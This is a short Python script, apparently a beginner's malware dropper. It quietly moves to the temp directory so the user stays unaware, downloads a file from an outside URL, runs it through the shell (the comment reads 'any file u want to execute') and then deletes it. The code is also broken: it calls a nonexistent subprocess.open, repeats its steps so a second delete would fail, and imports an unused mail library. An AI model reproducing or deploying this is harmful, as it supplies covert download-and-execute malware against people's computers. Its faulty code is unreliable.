#! /usr/bin/env python
import requests
import subprocess,smtplib,os,tempfile

def downlaod(url):
    get_response= requests.get(url)
    file_name=url.split("/")
    with open(file_name[-1],"wb") as out_file: #r is read
        out_file.write(get_response.content)

temp_directory=tempfile.gettempdir()
os.chdir(temp_directory) #move to temp dir so that user is unaware
downlaod("https://www.drivespark.com/car-image/640x480x100/car/16881810-hyundai_grand_i10.jpg")
subprocess.open("16881810-hyundai_grand_i10.jpg", shell=True)

downlaod("https://www.drivespark.com/car-image/640x480x100/car/16881810-hyundai_grand_i10.jpg")
subprocess.call("16881810-hyundai_grand_i10.jpg", shell=True)#any file u want to execute

os.remove("16881810-hyundai_grand_i10.jpg")
os.remove("16881810-hyundai_grand_i10.jpg")
